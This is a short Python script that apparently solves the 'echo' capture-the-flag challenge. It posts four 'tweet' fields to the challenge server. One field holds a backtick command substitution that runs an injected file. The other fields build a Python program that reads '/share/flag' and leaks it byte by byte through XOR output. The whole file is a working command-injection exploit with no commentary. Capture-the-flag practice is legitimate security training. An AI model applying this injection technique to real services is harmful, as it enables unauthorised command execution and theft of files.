from requests import Session

s = Session()
r = s.get("http://echo.chal.pwning.xxx:9977/", params={
# r = s.get("http://localhost:5000/", params={
"tweet_1":"#. `python /share/input`",
"tweet_2":"""import sys, os
p = '/share/flag'
l = os.stat(p).st_size / 65000
f = open(p)""",
"tweet_3":"""
for _ in range(l):
    c = 0
    for i in range(65000-1):
        c = c ^ ord(f.read(1))""",
"tweet_4":"""
    sys.stdout.write("%d. " % (c ^ ord(f.read(1))))
"""
})
print r.content
